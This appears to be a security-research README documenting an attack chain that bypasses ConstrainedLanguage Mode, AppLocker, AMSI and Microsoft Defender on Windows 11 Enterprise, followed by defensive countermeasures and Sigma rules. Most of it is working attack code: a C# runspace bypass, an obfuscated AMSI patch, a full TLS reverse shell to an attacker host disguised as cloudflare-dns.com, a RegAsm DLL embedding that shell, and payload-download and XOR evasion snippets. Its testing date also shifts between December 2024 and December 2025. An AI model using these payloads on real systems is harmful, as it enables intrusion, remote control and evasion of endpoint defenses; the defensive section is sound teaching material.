# Breaking Default Windows Enterprise Controls

This repository documents a lab-validated attack chain demonstrating how a standard domain user bypassed default Windows 11 Enterprise protections — including ConstrainedLanguage Mode, AppLocker, AMSI, and Microsoft Defender — without exploiting a vulnerability.

The goal is to illustrate where layered controls fail in composition and what defenders must monitor instead of relying on default enforcement.

**Key Finding:** Default enterprise configurations are not defensive boundaries. Each control operated correctly, but attackers exploit gaps between layers.

> **Testing Environment:** Fully patched Windows 11 Enterprise (December 2024) with Real-time Protection, Tamper Protection, Cloud-delivered Protection, CLM, and AppLocker all enabled.

---

## Table of Contents

1. [ConstrainedLanguage Mode (CLM) Bypass](#1-constrainedlanguage-mode-clm-bypass)
2. [AppLocker Bypass](#2-applocker-bypass)
3. [AMSI Bypass](#3-amsi-bypass)
4. [Windows Defender Evasion](#4-windows-defender-evasion)
5. [LOLBins - Living Off The Land Binaries](#5-lolbins---living-off-the-land-binaries)
6. [YARA Rule Evasion](#6-yara-rule-evasion)
7. [Defense-in-Depth Analysis](#7-defense-in-depth-analysis)

---

## 1. ConstrainedLanguage Mode (CLM) Bypass

### What CLM Blocks

- Reflection methods: `.GetType()`, `.GetMethod()`, `.GetField()`
- .NET type resolution beyond core types
- Dynamic type loading
- COM objects
- Custom type compilation (`Add-Type`)

### Why AMSI Bypass Fails in CLM

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Error: "Method invocation is supported only on core types in this language mode"
```

**Problem:** `.GetType()` method call (reflection API) is specifically blocked

### C# CLM Bypass - Custom Runspace

**Concept:** C#-created PowerShell runspace defaults to FullLanguage mode, ignoring system-wide CLM policy

**Implementation:**

```csharp
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace CLMBypass
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0) return;
            
            // Decode base64 argument
            string base64Command = args[0];
            byte[] decodedBytes = Convert.FromBase64String(base64Command);
            string decodedCommand = Encoding.Unicode.GetString(decodedBytes);
            
            // Create runspace in FullLanguage mode (bypasses CLM)
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            
            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;
            ps.AddScript(decodedCommand);
            
            Collection<PSObject> results = ps.Invoke();
            
            foreach (PSObject obj in results)
            {
                Console.WriteLine(obj.ToString());
            }
            
            runspace.Close();
        }
    }
}
```

### Compilation Requirements

**Visual Studio Setup:**
1. File → New → Project → Console App (.NET Framework)
2. Framework: .NET Framework 4.7.2 or 4.8 (NOT .NET Core/5+)
3. Add Reference:
   ```
   C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
   ```
4. Build → Configuration Manager → Release → x64
5. Build Solution

**Output:** `\CLMBypass\bin\Release\CLMBypass.exe`

### Usage

```powershell
# Encode payload
$payload = 'Get-Process'
$bytes = [Text.Encoding]::Unicode.GetBytes($payload)
$b64 = [Convert]::ToBase64String($bytes)

# Execute (bypasses CLM)
.\CLMBypass.exe $b64
```

### Why This Works

- C# program creates new PowerShell runspace
- Runspace defaults to FullLanguage mode
- Ignores `__PSLockdownPolicy` environment variable
- Commands executed inside bypass all CLM restrictions

---

## 2. AppLocker Bypass

### AppLocker Default Rules

**Allowed execution paths:**
- ✅ `%PROGRAMFILES%\*` (C:\Program Files)
- ✅ `%WINDIR%\*` (C:\Windows)
- ✅ `*` (everything) for Administrators only

### Bypass Location: C:\Windows\Tasks

**Why it works:**
- ✅ Within `%WINDIR%\*` (allowed by default)
- ✅ Writable by standard users
- ✅ Perfect for AppLocker bypass

### Testing AppLocker

**As standard user:**

```powershell
# Test from Desktop (should FAIL)
Copy-Item C:\path\to\tool.exe C:\Users\$env:USERNAME\Desktop\test.exe
C:\Users\$env:USERNAME\Desktop\test.exe
# Expected: "This program is blocked by group policy"

# Test from C:\Windows\Tasks (should WORK)
Copy-Item C:\path\to\tool.exe C:\Windows\Tasks\tool.exe
C:\Windows\Tasks\tool.exe <arguments>
# Should execute successfully
```

### Alternative Writable Allowed Paths

```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
```

### Enabling AppLocker (For Testing)

```powershell
# Enable service
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc

# Or use sc.exe to bypass PowerShell restrictions
sc.exe config AppIDSvc start= auto
sc.exe start AppIDSvc
```

### Checking AppLocker Status

```powershell
# Check if AppLocker service is running
Get-Service -Name AppIDSvc

# Get effective AppLocker policy
Get-AppLockerPolicy -Effective

# Check enforcement mode
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | 
  Where-Object {$_.RuleCollectionType -eq 'Exe'} | 
  Select-Object RuleCollectionType, EnforcementMode
```

---

## 3. AMSI Bypass

### Matt Graeber's Reflection-Based Bypass

**Original (detected):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Obfuscated (evades signature detection):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```

**Obfuscation techniques:**
- `'Amsi'+'Utils'` → Splits "AmsiUtils" string
- `'amsiInit'+'Failed'` → Splits "amsiInitFailed" string
- `!$false` → Same as `$true` (negation obfuscation)

### VBScript-Wrapped PowerShell Bypass

**Use case:** Execute AMSI bypass from VBScript to evade PowerShell-specific monitoring

```vbscript
Dim shell
Set shell = CreateObject("WScript.Shell")

command = "powershell -NoP -W Hidden -Command """ & _
"[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false);" & _
"<YOUR PAYLOAD HERE>" & _
""""

shell.Run command, 0, True
Set shell = Nothing
```

### Why CLM Breaks Standard AMSI Bypass

In ConstrainedLanguage mode:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Error: Method invocation is supported only on core types
```

**Solution:** Execute AMSI bypass inside FullLanguage runspace (see CLM bypass section)

---

## 4. Windows Defender Evasion

### TLS-Encrypted Reverse Shell

**Why this evades Defender:**
- ✅ TLS encryption hides malicious traffic
- ✅ Certificate CN mimics legitimate service
- ✅ Port 443 traffic appears as HTTPS
- ✅ Payload delivered at runtime (not on disk)

### Attack Box Setup

**Generate self-signed certificate:**
```bash
openssl req -x509 -newkey rsa:2048 \
  -keyout key.pem \
  -out cert.pem \
  -days 365 \
  -nodes \
  -subj "/CN=cloudflare-dns.com"
```

**Start TLS listener:**
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

### PowerShell TLS Reverse Shell

```powershell
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
$TCPClient = New-Object Net.Sockets.TCPClient('<ATTACKER_IP>', 443);
$NetworkStream = $TCPClient.GetStream();
$SslStream = New-Object Net.Security.SslStream(
    $NetworkStream,
    $false,
    ({$true} -as [Net.Security.RemoteCertificateValidationCallback])
);
$SslStream.AuthenticateAsClient('cloudflare-dns.com', $null, $sslProtocols, $false);

if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close();
    exit
}

$StreamWriter = New-Object IO.StreamWriter($SslStream);

function WriteToStream ($String) {
    [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
    $StreamWriter.Write($String + 'SHELL> ');
    $StreamWriter.Flush()
};

WriteToStream '';

while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }
    WriteToStream ($Output)
}

$StreamWriter.Close()
```

### Why "cloudflare-dns.com"?

**Network monitoring perspective:**
- TLS connection to cloudflare-dns.com on port 443
- Looks like DNS-over-HTTPS traffic
- Cloudflare DNS (1.1.1.1) is legitimate service
- Appears as benign cloud infrastructure traffic

**Certificate validation disabled:**
```powershell
({$true} -as [Net.Security.RemoteCertificateValidationCallback])
# This callback always returns $true = Accept ANY certificate
```

### Delivery Method

**Encode payload to avoid signatures:**
```powershell
$payload = '<TLS reverse shell code>'
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))

# Execute via CLM bypass
C:\Windows\Tasks\CLMBypass.exe $b64
```

---

## 5. LOLBins - Living Off The Land Binaries

### RegAsm.exe - .NET Assembly Registration

**Legitimate purpose:** Register .NET assemblies for COM interop

**Offensive use:** Execute arbitrary .NET code via COM registration callbacks

### RegAsm.exe Behavior

```powershell
# RegAsm.exe dll         → Needs Admin (writes registry) → Calls RegisterClass
# RegAsm.exe /U dll      → No admin needed (cleanup only) → Calls UnregisterClass
```

### Complete RegAsm CLM Bypass with TLS Shell

```csharp
using System;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace RegAsmBypass
{
    [ComVisible(true)]
    [Guid("B8E7E8E8-7E8E-4E8E-8E8E-8E8E8E8E8E8E")]
    [ClassInterface(ClassInterfaceType.None)]
    public class Payload
    {
        [ComRegisterFunction]
        public static void RegisterClass(string key)
        {
            Execute();
        }

        [ComUnregisterFunction]
        public static void UnregisterClass(string key)
        {
            Execute();  // Payload in both for flexibility
        }

        private static void Execute()
        {
            string tlsShell = @"
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
$TCPClient = New-Object Net.Sockets.TCPClient('<ATTACKER_IP>', 443);
$NetworkStream = $TCPClient.GetStream();
$SslStream = New-Object Net.Security.SslStream(
    $NetworkStream,
    $false,
    ({$true} -as [Net.Security.RemoteCertificateValidationCallback])
);
$SslStream.AuthenticateAsClient('cloudflare-dns.com', $null, $sslProtocols, $false);

if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close();
    exit
}

$StreamWriter = New-Object IO.StreamWriter($SslStream);

function WriteToStream ($String) {
    [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
    $StreamWriter.Write($String + 'SHELL> ');
    $StreamWriter.Flush()
};

WriteToStream '';

while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }
    WriteToStream ($Output)
}

$StreamWriter.Close()
";
            
            try
            {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = runspace;
                ps.AddScript(tlsShell);
                ps.Invoke();
                runspace.Close();
            }
            catch { }
        }
    }
}
```

### Compilation

**Visual Studio:**
1. New Project → Class Library (.NET Framework 4.8)
2. Add Reference → System.Management.Automation.dll
3. Paste code
4. Build → Release

### Execution

```powershell
# Execute (no admin required with /U)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U C:\path\to\RegAsmBypass.dll
```

### Why This Bypasses Defenses

**AppLocker:**
- ✅ RegAsm.exe is Microsoft-signed binary in `%WINDIR%\Microsoft.NET\`
- ✅ Allowed by default AppLocker rules
- ✅ Malicious DLL executes via trusted process

**Defender:**
- ✅ RegAsm.exe is whitelisted/trusted binary
- ✅ COM registration is legitimate Windows operation
- ✅ No obvious malicious file on disk (just a .NET assembly)

**CLM:**
- ✅ DLL can create FullLanguage runspace
- ✅ Bypasses PowerShell restrictions

---

## 6. YARA Rule Evasion

### Pattern-Based Detection Example

```yara
rule Suspicious_TLS_ReverseShell
{
    strings:
        $tls1 = "System.Security.Authentication.SslProtocols"
        $tls2 = "SslStream"
        $tls3 = "AuthenticateAsClient"
        $net1 = "TCPClient"
        $net2 = "GetStream"
        $exec1 = "Invoke-Expression"
        $exec2 = "StreamWriter"
        
    condition:
        4 of them
}
```

**This WOULD catch unobfuscated payloads**

### Evasion Technique 1: String Obfuscation

```csharp
// Instead of direct strings
string tcp = "TCP" + "Client";
string netSockets = "Net.Sockets." + tcp;
string ip = string.Concat("172", ".", "16", ".", "61", ".", "129");
string script = "$c = New-Object " + netSockets + "('" + ip + "', 443);";
```

### Evasion Technique 2: Base64 Encoding

```csharp
// TLS shell as base64 (no suspicious strings in binary)
string b64 = "JHNzbFByb3RvY29scyA9IFtTeXN0ZW0uU2VjdXJpdHkuQXV0...";
byte[] decoded = Convert.FromBase64String(b64);
string script = Encoding.UTF8.GetString(decoded);
```

### Evasion Technique 3: Download Payload (Stageless)

```csharp
using (var wc = new System.Net.WebClient())
{
    string script = wc.DownloadString("http://<ATTACKER_IP>/payload.txt");
    // Execute in runspace
}
```

### Evasion Technique 4: XOR Encryption

```csharp
// Encrypted payload
byte[] encrypted = new byte[] { 0x3A, 0x9F, 0x2C, /* ... */ };

// XOR decrypt with key
byte[] key = Encoding.UTF8.GetBytes("MyKey123");
for (int i = 0; i < encrypted.Length; i++)
{
    encrypted[i] ^= key[i % key.Length];
}

string script = Encoding.UTF8.GetString(encrypted);
```

---

## 7. Defense-in-Depth Analysis

### Full Windows 11 Enterprise Bypass Achievement

**Environment:**
- Target: Windows 11 Enterprise (fully patched, December 2025)
- User: Standard account (non-administrator)

**Defenses Active:**
- ✅ Real-time Protection: ON
- ✅ Dev Drive Protection: ON
- ✅ Cloud-delivered Protection: ON
- ✅ Tamper Protection: ON
- ✅ ConstrainedLanguage Mode: Enforced
- ✅ AppLocker: Enabled (default rules, Enforce mode)

### Attack Chain

**Step 1: CLM Bypass**
- Built custom C# tool (.NET Framework 4.8)
- Creates FullLanguage PowerShell runspace
- Accepts UTF-8 base64-encoded payloads as runtime arguments
- No malicious code embedded in binary

**Step 2: AppLocker Bypass**
- AppLocker blocked execution from Desktop and Downloads
- C:\Windows\Tasks = writable + within allowed `%WINDIR%\*` path
- Execution from this location bypassed restrictions

**Step 3: Defender Evasion**
- TLS-encrypted reverse shell on port 443
- Certificate CN: cloudflare-dns.com (mimics DNS-over-HTTPS)
- Custom code + encrypted channel + runtime delivery evaded all protections

### Validation

```powershell
SHELL> whoami
desktop-rd3160s\oj1

SHELL> $ExecutionContext.SessionState.LanguageMode
FullLanguage

SHELL> Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, TamperProtectionSource
RealTimeProtectionEnabled TamperProtectionSource
------------------------- ----------------------
                     True UI

SHELL> Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | 
       Where-Object {$_.RuleCollectionType -eq 'Exe'} | Select-Object EnforcementMode
EnforcementMode
---------------
        Enabled
```

**Result:** Parent PowerShell session remained in ConstrainedLanguage while reverse shell operated in FullLanguage

### How Each Layer Was Defeated

**ConstrainedLanguage Mode:**
- Purpose: Restrict PowerShell capabilities
- Bypass: Custom C# runspace defaults to FullLanguage
- Lesson: Session-level restrictions don't apply to programmatically created environments

**AppLocker:**
- Purpose: Control executable execution locations
- Bypass: C:\Windows\Tasks is writable + within allowed path
- Lesson: Default rules often have writable allowed locations

**Windows Defender:**
- Purpose: Detect and block malware
- Bypass: Custom code + TLS encryption + runtime delivery
- Lesson: Signature-based detection + behavioral analysis defeated by novel techniques

**AMSI:**
- Purpose: Scan PowerShell scripts for malicious content
- Bypass: Matt Graeber's reflection-based patch (obfuscated)
- Lesson: Known bypasses still work when obfuscated

### Why Defense-in-Depth Failed

**Each layer operated correctly:**
- ✅ CLM was enforced
- ✅ AppLocker blocked unauthorized locations
- ✅ Defender scanned files
- ✅ AMSI monitored PowerShell

**But attackers exploit gaps between layers:**
- Custom runspace bypassed CLM
- Allowed writable path bypassed AppLocker
- Encrypted channel + clean binary bypassed Defender
- Obfuscated bypass defeated AMSI

**Lesson:** Checkbox security (enabling all features) ≠ effective security. Need holistic monitoring and understanding of attacker tradecraft.

---

## Key Commands Reference

### Check .NET Version
```powershell
[System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
```

### Enable CLM (For Testing)
```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

### Test Network Connectivity
```powershell
Test-NetConnection -ComputerName <ATTACKER_IP> -Port 443
```

### Check AppLocker Status
```powershell
Get-Service -Name AppIDSvc
Get-AppLockerPolicy -Effective
```

### Encode PowerShell Payload
```powershell
$cmd = 'Your-PowerShell-Command'
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cmd))
```

---

## Important File Paths

### System.Management.Automation.dll
```
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
```

### RegAsm.exe
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe
C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
```

### AppLocker Bypass Locations
```
C:\Windows\Tasks (writable + allowed)
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
```

---

## How To Actually Stop This

### Defensive Countermeasures

**Replace Default AppLocker with WDAC:**
- Windows Defender Application Control enforces stricter code integrity
- Blocks writable allowed paths by design
- Requires publisher certificates, not just path-based rules

**Block Writable Windows Paths:**
```powershell
# Deny write access to C:\Windows\Tasks for standard users
icacls "C:\Windows\Tasks" /deny Users:(OI)(CI)W
```

**Enforce ConstrainedLanguage via UMCI:**
- User Mode Code Integrity locks down PowerShell to CLM
- Cannot be bypassed by custom runspaces
- Requires system-level policy enforcement

**Monitor Runspace Creation:**
```
Event ID 4104 - PowerShell Script Block Logging
Event ID 4103 - Module Logging
Monitor for: RunspaceFactory.CreateRunspace() calls
```

**TLS Inspection & Anomaly Detection:**
- Inspect outbound TLS on port 443
- Alert on non-browser processes initiating TLS
- Flag connections to unusual CNs (cloudflare-dns.com from PowerShell)

**Attack Surface Reduction (ASR) Rules:**
```powershell
# Block process creation from PSExec/WMI
Add-MpPreference -AttackSurfaceReductionRules_Ids D1E49AAC-8F56-4280-B9BA-993A6D77406C -AttackSurfaceReductionRules_Actions Enabled

# Block untrusted programs from removable drives  
Add-MpPreference -AttackSurfaceReductionRules_Ids b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4 -AttackSurfaceReductionRules_Actions Enabled
```

**PowerShell Transcription:**
```powershell
# Enable transcription to log all PowerShell activity
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\PSTranscripts"
```

**EDR Child-Process Modeling:**
- Monitor RegAsm.exe spawning unusual child processes
- Alert on trusted binaries loading unexpected DLLs
- Track PowerShell runspace creation from non-interactive contexts

**Least Privilege:**
- Reduce standard user write permissions
- Audit all writable locations in `%WINDIR%`
- Remove unnecessary SeTakeOwnershipPrivilege grants

### Detection Rules

**Sigma Rule - CLM Bypass via Runspace:**
```yaml
title: PowerShell Runspace Creation Bypass
description: Detects creation of PowerShell runspace to bypass ConstrainedLanguage
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - 'RunspaceFactory.CreateRunspace'
      - 'Runspace.Open'
  condition: selection
```

**Sigma Rule - RegAsm LOLBin Abuse:**
```yaml
title: RegAsm Executing Suspicious DLL
description: Detects RegAsm.exe loading DLL from writable location
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\RegAsm.exe'
    CommandLine|contains:
      - 'C:\Windows\Tasks\'
      - 'C:\Windows\Temp\'
      - 'C:\Users\'
  condition: selection
```

---

---

**Research Context:** This work originated from HTB Academy's Windows Evasion module, where 877 users (0.04% of 2.2M) achieved completion. The techniques were validated beyond the training environment on real Windows 11 Enterprise systems.

---

**Sources:**
- HTB Academy Windows Evasion Module
- Personal lab testing and validation
- Real-world bypass testing on Windows 11 Enterprise

**Achievement:** Top 0.04% global ranking (877/2,200,000 users)

**Note:** All IP addresses and specific system details sanitized for public documentation.
